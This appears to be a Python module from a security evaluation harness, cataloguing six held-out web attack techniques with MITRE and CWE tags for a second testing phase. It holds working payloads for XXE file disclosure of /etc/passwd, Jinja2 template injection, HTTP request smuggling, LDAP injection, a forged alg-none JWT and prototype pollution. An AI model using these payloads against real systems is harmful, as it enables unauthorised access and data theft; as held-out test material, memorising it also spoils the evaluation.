"""
Phase 2 — Held-Out Attack Technique Catalog.

Curated set of advanced attack techniques that were NEVER used anywhere in Phase 1.
Keeping these strictly separate ensures Phase 2's evaluation is genuine rather than
testing against vulnerabilities the system was already hardened against.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import List


@dataclass
class HeldOutTechnique:
    id: str
    name: str
    mitre_technique: str
    cwe_id: str
    severity: str
    endpoint: str
    method: str
    param_name: str
    payload: str
    description: str


HELD_OUT_TECHNIQUES: List[HeldOutTechnique] = [
    HeldOutTechnique(
        id="xxe_injection",
        name="XML External Entity (XXE) Injection",
        mitre_technique="T1190",
        cwe_id="CWE-611",
        severity="critical",
        endpoint="/api/upload_xml",
        method="POST",
        param_name="xml_data",
        payload='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        description="XXE injection attempting unauthorized file disclosure via XML parser entity expansion.",
    ),
    HeldOutTechnique(
        id="ssti_template_injection",
        name="Server-Side Template Injection (SSTI)",
        mitre_technique="T1059",
        cwe_id="CWE-1336",
        severity="critical",
        endpoint="/render_template",
        method="GET",
        param_name="template",
        payload="{{7*7}} {{config.items()}}",
        description="Jinja2/Werkzeug template injection attempting arbitrary configuration leakage.",
    ),
    HeldOutTechnique(
        id="http_request_smuggling",
        name="HTTP Request Smuggling (CL.TE Desync)",
        mitre_technique="T1212",
        cwe_id="CWE-444",
        severity="high",
        endpoint="/gateway/pipeline",
        method="POST",
        param_name="body",
        payload="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n",
        description="Dual Content-Length and Transfer-Encoding desynchronization attack.",
    ),
    HeldOutTechnique(
        id="ldap_injection",
        name="LDAP Filter Injection",
        mitre_technique="T1210",
        cwe_id="CWE-90",
        severity="high",
        endpoint="/auth/directory",
        method="GET",
        param_name="filter",
        payload="*)(uid=*))(|(uid=*",
        description="LDAP filter wildcard injection to bypass directory authentication queries.",
    ),
    HeldOutTechnique(
        id="jwt_none_algorithm",
        name="JWT Signature Stripping (Alg: None)",
        mitre_technique="T1552",
        cwe_id="CWE-347",
        severity="high",
        endpoint="/api/verify_token",
        method="POST",
        param_name="token",
        payload="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIn0.",
        description="Forged JSON Web Token with 'none' signature algorithm bypass.",
    ),
    HeldOutTechnique(
        id="prototype_pollution",
        name="Prototype Pollution Object Injection",
        mitre_technique="T1190",
        cwe_id="CWE-1321",
        severity="high",
        endpoint="/api/merge_profile",
        method="POST",
        param_name="data",
        payload='{"__proto__": {"isAdmin": true, "polluted": "yes"}}',
        description="Prototype pollution injecting properties into base object prototype.",
    ),
]


def get_held_out_techniques() -> List[HeldOutTechnique]:
    """Return the held-out techniques reserved exclusively for Phase 2 evaluation."""
    return list(HELD_OUT_TECHNIQUES)
